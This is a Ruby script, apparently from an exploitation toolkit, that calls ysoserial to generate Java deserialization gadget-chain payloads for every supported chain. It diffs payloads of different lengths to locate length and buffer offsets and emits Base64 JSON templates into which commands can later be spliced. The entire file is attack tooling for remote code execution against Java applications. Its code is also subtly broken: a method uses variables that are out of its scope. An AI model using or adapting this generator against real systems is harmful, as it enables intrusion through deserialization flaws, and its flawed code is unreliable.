#!/usr/bin/env ruby

require 'diff-lcs'
require 'json'
require 'base64'
require 'open3'

YSOSERIAL_RANDOMIZED_HEADER = 'ysoserial/Pwner'
PAYLOAD_TEST_MIN_LENGTH = 4
PAYLOAD_TEST_MAX_LENGTH = 5

# ARGV parsing
if ARGV.include?("-h")
  puts 'ysoserial object template generator'
  puts
  puts 'Usage:'
  puts '  -h          Help'
  puts '  -d          Debug mode (output offset information only)'
  puts "  -m [type]   Use 'ysoserial-modified' with the specified payload type"
  puts
  abort
end

debug = ARGV.include?('-d')
ysoserial_modified = ARGV.include?('-m')
if ysoserial_modified
  payload_type = ARGV[ARGV.find_index('-m')+1]
  unless ['cmd', 'bash', 'powershell', 'none'].include?(payload_type)
    STDERR.puts 'ERROR: Invalid payload type specified'
    abort
  end
end

def generate_payload(payload_name,search_string_length)
  # Generate a string of specified length and embed it into an ASCII-encoded ysoserial payload
  searchString = 'A' * search_string_length

  # Build the command line with ysoserial parameters
  if ysoserial_modified
    stdout, stderr, status = Open3.capture3('java','-jar','ysoserial-modified.jar',payload_name.to_s,payload_type.to_s,searchString.to_s)
  else
    stdout, stderr, status = Open3.capture3('java','-jar','ysoserial-original.jar',payload_name.to_s,searchString.to_s)
  end

  payload = stdout
  payload.force_encoding('binary')

  if payload.length == 0 && stderr.length > 0
    # Pipe errors out to the console
    STDERR.puts stderr.split("\n").each {|i| i.prepend("    ")}
  elsif stderr.include? 'java.lang.IllegalArgumentException'
    #STDERR.puts "  WARNING: '#{payload_name}' requires complex args and may not be supported"
    return nil
  elsif stderr.include? 'Error while generating or serializing payload'
    #STDERR.puts "  WARNING: '#{payload_name}' errored and may not be supported"
    return nil
  elsif stdout == "\xac\xed\x00\x05\x70"
    #STDERR.puts "  WARNING: '#{payload_name}' returned null and may not be supported"
    return nil
  else
    #STDERR.puts "  Successfully generated #{payload_name} using #{YSOSERIAL_BINARY}"

    # Strip out the semi-randomized ysoserial string and trailing newline
    payload.gsub!(/#{YSOSERIAL_RANDOMIZED_HEADER}[[:digit:]]+/, 'ysoserial/Pwner00000000000000')
    return payload
  end
end

def generate_payload_array(payload_name)
  # Generate and return a number of payloads, each with increasingly longer strings, for future comparison
  payload_array = []
  (PAYLOAD_TEST_MIN_LENGTH..PAYLOAD_TEST_MAX_LENGTH).each do |i|
    payload = generate_payload(payload_name,i)
    return nil if payload.nil?
    payload_array[i] = payload
  end

  payload_array
end

def isLengthOffset?(current_byte, next_byte)
  # If this byte has been changed, and is different by one, then it must be a length value
  if next_byte && current_byte.position == next_byte.position && current_byte.action == "-"
    if next_byte.element.ord - current_byte.element.ord == 1
      return true
    end
  end

  false
end

def isBufferOffset?(current_byte, next_byte)
  # If this byte has been inserted, then it must be part of the increasingly large payload buffer
  if (current_byte.action == '+' && (next_byte.nil? || (current_byte.position != next_byte.position)))
    return true
  end

  false
end

def diff(a,b)
  return nil if a.nil? or b.nil?

  diffs = []
  obj = Diff::LCS.diff(a,b)
  obj.each do |i|
    i.each do |j|
      diffs.push(j)
    end
  end

  diffs
end

def get_payload_list
  # Call ysoserial and return the list of payloads that can be generated
  payloads = `java -jar ysoserial-original.jar 2>&1`
  payloads.encode!('ASCII', 'binary', invalid: :replace, undef: :replace, replace: '')
  payloads = payloads.split("\n")

  # Make sure the headers are intact, then skip over them
  abort unless payloads[0] == 'Y SO SERIAL?'
  payloads = payloads.drop(5)

  payloadList = []
  payloads.each do |line|
    # Skip the header rows
    next unless line.start_with? "     "
    payloadList.push(line.scan(/^     ([^ ]*) .*/).first.last)
  end

  payloadList
end

results = {}
payloadList = get_payload_list
payloadList.each do |payload|
  STDERR.puts "Generating payloads for #{payload}..."

  empty_payload = generate_payload(payload,0)

  if empty_payload.nil?
    STDERR.puts "  ERROR: Errored while generating '#{payload}' and it will not be supported"
    results[payload]={"status": "unsupported"}
    next
  end

  payload_array = generate_payload_array(payload)

  length_offsets = []
  buffer_offsets = []

  # Comparing diffs of various payload lengths to find length and buffer offsets
  (PAYLOAD_TEST_MIN_LENGTH..PAYLOAD_TEST_MAX_LENGTH).each do |i|
    # Compare this binary with the next one
    diffs = diff(payload_array[i],payload_array[i+1])

    break if diffs.nil?
 
    # Iterate through each diff, searching for offsets of the length and the payload
    (0..diffs.length-1).each do |j|
      current_byte = diffs[j]
      next_byte = diffs[j+1]
      prevByte = diffs[j-1]

      if j > 0
        # Skip this if we compared these two bytes on the previous iteration
        next if prevByte.position == current_byte.position
      end

      # Compare this byte and the following byte to identify length and buffer offsets
      length_offsets.push(current_byte.position) if isLengthOffset?(current_byte,next_byte)
      buffer_offsets.push(current_byte.position) if isBufferOffset?(current_byte,next_byte)
    end
  end

  if debug
    for length_offset in length_offsets
      STDERR.puts "  LENGTH OFFSET #{length_offset} = 0x#{empty_payload[length_offset-1].ord.to_s(16)} #{empty_payload[length_offset].ord.to_s(16)}"
    end

    for buffer_offset in buffer_offsets
      STDERR.puts "  BUFFER OFFSET #{buffer_offset}"
    end
    STDERR.puts "  PAYLOAD LENGTH: #{empty_payload.length}"
  end

  payloadBytes = Base64.strict_encode64(empty_payload).gsub(/\n/,"")
  if buffer_offsets.length > 0
    results[payload] = {
      'status': 'dynamic',
      'lengthOffset': length_offsets.uniq,
      'bufferOffset': buffer_offsets.uniq,
      'bytes': payloadBytes
    }
  else
    #TODO: Turns out ysoserial doesn't have any static payloads.  Consider removing this.
    results[payload] = {
      'status': 'static',
      'bytes': payloadBytes
    }
  end
end

payloadCount = {}
payloadCount['skipped'] = 0
payloadCount['static']  = 0
payloadCount['dynamic'] = 0

results.each do |k,v|
  if v[:status] == 'unsupported'
    payloadCount['skipped'] += 1
  elsif v[:status] == 'static'
    payloadCount['static'] += 1
  elsif v[:status] == 'dynamic'
    payloadCount['dynamic'] += 1
  end
end

unless debug
  puts JSON.generate(results)
end

STDERR.puts "DONE!  Successfully generated #{payloadCount['static']} static payloads and #{payloadCount['dynamic']} dynamic payloads.  Skipped #{payloadCount['skipped']} unsupported payloads."
